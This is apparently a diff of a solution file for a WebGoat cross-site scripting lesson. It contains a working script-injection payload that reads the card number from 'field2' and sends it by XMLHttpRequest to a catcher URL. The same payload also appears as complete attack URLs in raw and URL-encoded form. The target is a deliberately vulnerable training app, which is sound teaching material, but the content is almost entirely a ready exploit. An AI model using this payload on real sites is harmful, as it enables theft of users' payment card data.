@@ -1,18 +1,23 @@
 111
 <!--
 'field1' is vulnerable, and allows for script injection
-Note, requires clicking of the purchase button twice
 URL is: http://localhost:8090/WebGoat/catcher?src=1406352188&menu=900&PROPERTY=yes&card=
 Card number is captured from 'field2'
+URL Encode the script and input as field 1 in parameters
 -->
 <br>
-	<script type="text/javascript">
-		document.getElementById('message').innerHTML = "Congratulations. You have successfully completed this lesson.";
-		var attackSite = "http://localhost:8090/WebGoat/catcher?src=1406352188&menu=900&PROPERTY=yes&card=";
-		var cardNum = document.getElementsByName("field2")[0];
-		var totalString = attackSite + cardNum.value;
-		var encodedUrl = totalString.replace(/ /g,'');
-		var xmlHttp = new XMLHttpRequest();
-		xmlHttp.open("GET", encodedUrl, false);
-		xmlHttp.send(null);
-	</script>
+		<script type="text/javascript">
+			document.getElementById('message').innerHTML = "Congratulations. You have successfully completed this lesson.";
+			var attackSite = "http://localhost:8090/WebGoat/catcher?src=1406352188&menu=900&PROPERTY=yes&card=";
+			var cardNum = document.getElementsByName("field2")[0];
+			var totalString = attackSite + cardNum.value;
+			var encodedUrl = totalString.replace(/ /g,'');
+			var xmlHttp = new XMLHttpRequest();
+			xmlHttp.open("GET", encodedUrl, false);
+			xmlHttp.send(null);
+		</script>
+
+http://localhost:8090/WebGoat/start.mvc#attack/1406352188/900?field2=123&field1=<script type="text/javascript">document.getElementById('message').innerHTML = "Congratulations. You have successfully completed this lesson.";var attackSite = "http://localhost:8090/WebGoat/catcher?src=1406352188&menu=900&PROPERTY=yes&card=";var cardNum = document.getElementsByName("field2")[0];var totalString = attackSite + cardNum.value;var encodedUrl = totalString.replace(/ /g,'');var xmlHttp = new XMLHttpRequest();xmlHttp.open("GET", encodedUrl, false);xmlHttp.send(null);</script>
+
+
+http://localhost:8090/WebGoat/start.mvc#attack/1406352188/900?field2=123&field1=%3Cscript%20type%3D%22text%2Fjavascript%22%3Edocument.getElementById(%27message%27).innerHTML%20%3D%20%22Congratulations.%20You%20have%20successfully%20completed%20this%20lesson.%22%3Bvar%20attackSite%20%3D%20%22http%3A%2F%2Flocalhost%3A8090%2FWebGoat%2Fcatcher%3Fsrc%3D1406352188%26menu%3D900%26PROPERTY%3Dyes%26card%3D%22%3Bvar%20cardNum%20%3D%20document.getElementsByName(%22field2%22)%5B0%5D%3Bvar%20totalString%20%3D%20attackSite%20%2B%20cardNum.value%3Bvar%20encodedUrl%20%3D%20totalString.replace(%2F%20%2Fg%2C%27%27)%3Bvar%20xmlHttp%20%3D%20new%20XMLHttpRequest()%3BxmlHttp.open(%22GET%22%2C%20encodedUrl%2C%20false)%3BxmlHttp.send(null)%3B%3C%2Fscript%3E
